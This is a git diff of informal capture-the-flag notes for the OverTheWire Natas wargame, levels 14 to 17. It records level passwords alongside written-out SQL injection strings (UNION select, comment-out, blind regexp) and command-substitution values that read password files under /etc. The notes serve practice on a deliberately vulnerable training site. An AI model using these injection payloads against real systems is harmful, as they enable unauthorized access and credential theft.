@@ -96,4 +96,35 @@ get an image file, in the bottom write php code, and put it in the website
 
 * 14: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
 
+in username:
+natas15"#
 
+in password:
+hi" UNION select * from users where username not like "*
+
+BROOOOO YOU CAN HAVE COMMENTS!!!!!
+
+* 15: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+natas16" and cast(password as binary) regexp '^..w' # 
+
+loop through this. Maybe use python or something
+
+blind based sql injection
+
+couldve used the injection natas16" and password LIKE BINARY"
+
+* 16: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+$(grep -o ^. /etc/natas_webpass/natas17)
+$(cut -c 2 /etc/natas_webpass/natas17)
+
+_PS_H_GWBN_rD_S_GMADGqNDKHPKq_CW
+_Ps_H_GWbn_rd_S_GmAdgQNdkhPkq_cw
+
+> Learn perl style regexes 
+cat 16pass.txt | grep -oP '^.\K(a)'
+
+^$(grep -oP ^.\K(P) /etc/natas_webpass/natas17)
+
+* 17: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
